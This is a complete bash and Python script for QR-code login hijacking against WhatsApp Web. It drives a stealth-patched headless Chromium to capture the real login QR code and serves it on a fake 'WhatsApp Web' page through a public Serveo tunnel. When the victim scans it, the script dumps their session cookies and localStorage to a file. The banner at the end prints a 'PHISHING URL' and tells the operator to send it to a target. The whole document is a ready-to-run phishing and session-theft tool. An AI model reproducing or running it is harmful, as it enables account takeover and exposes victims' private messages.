cat > run.sh << 'SCRIPT_END'
#!/data/data/com.termux/files/usr/bin/bash
set -e

echo ""
echo "╔═══════════════════════════════════════════════════╗"
echo "║   WhatsApp QRLJack – Single Shot Install & Run    ║"
echo "╚═══════════════════════════════════════════════════╝"
echo ""

# ─── 1. INSTALL DEPENDENCIES ──────────────────────────────────────────
echo "[*] Updating packages..."
pkg update -y -qq 2>/dev/null

echo "[*] Installing repositories & browser..."
pkg install -y -qq tur-repo x11-repo 2>/dev/null
pkg install -y -qq chromium xorg-server-xvfb python python-pip openssh 2>/dev/null

echo "[*] Installing Python packages..."
pip install --quiet flask undetected-chromedriver fake-useragent pyngrok requests pillow qrcode[pil] 2>/dev/null

# ─── 2. CREATE PYTHON SCRIPT ──────────────────────────────────────────
cat > qrjack.py << 'PYEOF'
#!/usr/bin/env python3
"""
WhatsApp QRLJack – Stealth (Xvfb + undetected_chromedriver)
Single-file. Copy-paste and run.
"""

import os, sys, json, time, threading, logging, re, shutil, atexit, subprocess
from pathlib import Path
from datetime import datetime
from flask import Flask, render_template_string, jsonify, send_file
import undetected_chromedriver as uc
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("qrjack")

HOST = "0.0.0.0"
PORT = 5000
QR_FILE = "static/qr.png"
PROFILE = os.path.expanduser("~/.whatsapp-phish-profile")
CHROME_BIN = "/data/data/com.termux/files/usr/bin/chromium"
CHROMEDRIVER = "/data/data/com.termux/files/usr/bin/chromedriver"

app = Flask(__name__)
state = {"qr_available": False, "authenticated": False, "session_data": None}
driver = None

# ─── Xvfb ──────────────────────────────────────────────────────────────
def start_xvfb():
    os.environ["DISPLAY"] = ":99"
    os.system("kill $(cat /tmp/.X99-lock 2>/dev/null) 2>/dev/null || true")
    os.system("Xvfb :99 -screen 0 1280x800x24 -ac >/dev/null 2>&1 &")
    time.sleep(2)
    if os.path.exists("/tmp/.X99-lock"):
        log.info("Xvfb running on :99")
        return True
    log.error("Xvfb failed")
    return False

# ─── Stealth Driver ────────────────────────────────────────────────────
def create_driver():
    global driver
    os.makedirs(PROFILE, exist_ok=True)
    os.makedirs("static", exist_ok=True)

    opts = uc.ChromeOptions()
    opts.binary_location = CHROME_BIN
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1280,800")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--disable-extensions")
    opts.add_argument("--no-first-run")
    opts.add_argument("--lang=en-US")
    opts.add_argument(f"--user-data-dir={PROFILE}")

    try:
        ua = UserAgent(os="android")
        agent = ua.chrome
    except:
        agent = ("Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 "
                 "(KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36")
    opts.add_argument(f"--user-agent={agent}")

    try:
        driver = uc.Chrome(options=opts, headless=False, use_subprocess=True,
                           driver_executable_path=CHROMEDRIVER, version_main=125)
    except:
        log.info("Retrying auto version...")
        driver = uc.Chrome(options=opts, headless=False, use_subprocess=True,
                           driver_executable_path=CHROMEDRIVER)

    stealth = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    Object.defineProperty(navigator,'plugins',{get:()=>[
        {name:'Chrome PDF Plugin',filename:'internal-pdf-viewer'},
        {name:'Chrome PDF Viewer',filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai'},
        {name:'Native Client',filename:'internal-nacl-plugin'}
    ]});
    Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
    Object.defineProperty(navigator,'permissions',{value:{query:(p)=>
        p.name==='notifications'?Promise.resolve({state:'prompt'}):Promise.resolve({state:'granted'})
    }});
    window.chrome=window.chrome||{};window.chrome.runtime=window.chrome.runtime||{};
    window.chrome.runtime.connect=()=>({});window.chrome.runtime.sendMessage=()=>({});
    window.chrome.runtime.onMessage={addListener:()=>{}};
    delete Object.getPrototypeOf(navigator).webdriver;
    """
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": stealth})
    log.info("Stealth patches injected")
    return True

# ─── QR Capture ────────────────────────────────────────────────────────
def capture_qr():
    driver.get("https://web.whatsapp.com")
    time.sleep(10)
    try:
        driver.find_element(By.CSS_SELECTOR, "[data-testid='chat-list']")
        state["authenticated"] = True
        log.info("Already authenticated!")
        return True
    except:
        pass
    try:
        canvas = WebDriverWait(driver, 40).until(EC.presence_of_element_located((By.TAG_NAME, "canvas")))
        time.sleep(2)
        png = canvas.screenshot_as_png
        with open(QR_FILE, "wb") as f:
            f.write(png)
        state["qr_available"] = True
        log.info("QR captured!")
        return True
    except Exception as e:
        log.error(f"QR failed: {e}")
        return False

# ─── Auth Wait ─────────────────────────────────────────────────────────
def wait_auth(timeout=180):
    log.info(f"Waiting {timeout}s for scan...")
    try:
        WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='chat-list']"))
        )
        state["authenticated"] = True
        log.info("AUTHENTICATED!")
        return True
    except:
        return False

# ─── Extract Session ───────────────────────────────────────────────────
def extract_session():
    cookies = driver.get_cookies()
    ls = driver.execute_script("""
        var i={};for(var k=0;k<localStorage.length;k++){var key=localStorage.key(k);i[key]=localStorage.getItem(key)};return i
    """)
    try:
        name = driver.find_element(By.CSS_SELECTOR, "header span[dir='auto']").text
    except:
        name = "unknown"
    sess = {"timestamp": datetime.now().isoformat(), "profile": name, "cookies": cookies, "localStorage": ls}
    with open("session_dump.json","w") as f:
        json.dump(sess, f, indent=2)
    state["session_data"] = sess
    log.info(f"Session saved: {name}")

# ─── HTML ──────────────────────────────────────────────────────────────
HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#00a884,#25d366);min-height:100vh;display:flex;justify-content:center;align-items:center}
.card{background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.18);width:420px;max-width:92vw;padding:36px 28px;text-align:center}
.logo{width:48px;height:48px;background:#25d366;border-radius:12px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:700}
h1{font-size:20px;color:#1f2a33;margin-bottom:2px}
.sub{color:#667781;font-size:13px;margin-bottom:20px}
.qr{background:#f0faf5;border:2px dashed #25d366;border-radius:12px;padding:18px;margin-bottom:16px;min-height:270px;display:flex;flex-direction:column;align-items:center;justify-content:center}
.qr img{width:210px;height:210px;image-rendering:pixelated}
.stat{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;background:#f5f6f7;border-radius:10px;font-size:13px;color:#667781;margin-bottom:16px}
.dot{width:8px;height:8px;border-radius:50%;display:inline-block}
.dot.g{background:#25d366;animation:pulse 1.5s infinite}
.dot.r{background:#e74c3c}
.dot.gr{background:#bbb}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.inst{text-align:left;font-size:12px;color:#8696a0;padding:0 6px;margin-top:10px}
.inst p{margin:5px 0}
</style></head>
<body><div class="card">
<div class="logo">WA</div>
<h1>WhatsApp Web</h1>
<p class="sub">Use WhatsApp on your computer</p>
<div class="qr"><img id="qi" src="/qr-code" alt="QR"></div>
<div class="stat"><span class="dot g" id="sd"></span><span id="st">Waiting for scan...</span></div>
<div class="inst"><p>1. Open WhatsApp on your phone</p><p>2. Tap <strong>Menu</strong> → <strong>Linked Devices</strong></p><p>3. Scan this QR code</p></div>
</div>
<script>
function poll(){fetch('/status').then(r=>r.json()).then(d=>{let e=document.getElementById('sd'),t=document.getElementById('st');if(d.authenticated){e.className='dot r';t.innerText='Session captured!'}else if(d.qr){e.className='dot g';t.innerText='Waiting for scan...'}else{e.className='dot gr';t.innerText='Initializing...'}}).catch(()=>{})}
setInterval(poll,2000);poll();
</script></body></html>"""

@app.route("/")
def idx():
    return render_template_string(HTML)

@app.route("/qr-code")
def qr():
    p = Path(QR_FILE)
    if p.exists():
        return send_file(str(p), mimetype="image/png")
    return "", 404

@app.route("/status")
def st():
    return jsonify({"qr": state["qr_available"], "authenticated": state["authenticated"]})

# ─── Cleanup ───────────────────────────────────────────────────────────
@atexit.register
def cleanup():
    if driver:
        try: driver.quit()
        except: pass
    os.system("kill $(pgrep Xvfb) 2>/dev/null || true")

# ─── Main ──────────────────────────────────────────────────────────────
def main():
    print("\n[*] Starting WhatsApp QRLJack (Stealth Mode)...\n")
    if not start_xvfb():
        return
    if not create_driver():
        return
    if not capture_qr():
        return
    threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True).start()
    print(f"\n[*] Server running on http://{HOST}:{PORT}")
    if not state["authenticated"]:
        if wait_auth():
            extract_session()
    print("[*] Ready. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
PYEOF

# ─── 3. START Xvfb FIRST ──────────────────────────────────────────────
echo "[*] Starting virtual display..."
kill $(cat /tmp/.X99-lock 2>/dev/null) 2>/dev/null || true
Xvfb :99 -screen 0 1280x800x24 -ac >/dev/null 2>&1 &
sleep 2
export DISPLAY=:99

# ─── 4. START PYTHON IN BACKGROUND ─────────────────────────────────────
echo "[*] Launching QRJack..."
python qrjack.py &
PYTHON_PID=$!
sleep 8

# ─── 5. START SERVEO TUNNEL ───────────────────────────────────────────
echo "[*] Opening Serveo tunnel..."
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
    -R 80:localhost:5000 serveo.net 2>&1 | tee /tmp/serveo.log &
SSH_PID=$!

# ─── 6. WAIT FOR URL ──────────────────────────────────────────────────
echo "[*] Waiting for public URL..."
URL=""
for i in $(seq 1 20); do
    URL=$(grep -o 'https://[a-z0-9]*\.serveo.net' /tmp/serveo.log 2>/dev/null | head -1)
    if [ -n "$URL" ]; then break; fi
    sleep 1
done

echo ""
echo "╔═══════════════════════════════════════════════════╗"
echo "║                  🎯  READY                        ║"
echo "╠═══════════════════════════════════════════════════╣"
if [ -n "$URL" ]; then
    echo "║  PHISHING URL:  $URL  ║"
else
    echo "║  PHISHING URL:  (check Serveo output above)   ║"
fi
echo "║                                                   ║"
echo "║  Send the URL to your target.                     ║"
echo "║  When they scan the QR code → session captured!   ║"
echo "╚═══════════════════════════════════════════════════╝"
echo ""
echo "  Dashboard:   http://localhost:5000"
echo "  Session:     session_dump.json (after auth)"
echo ""
echo "  Ctrl+C to stop everything."
echo ""

# ─── 7. WAIT ──────────────────────────────────────────────────────────
trap "kill $PYTHON_PID $SSH_PID 2>/dev/null; exit" INT TERM
wait $PYTHON_PID
SCRIPT_END

chmod +x run.sh
bash run.sh
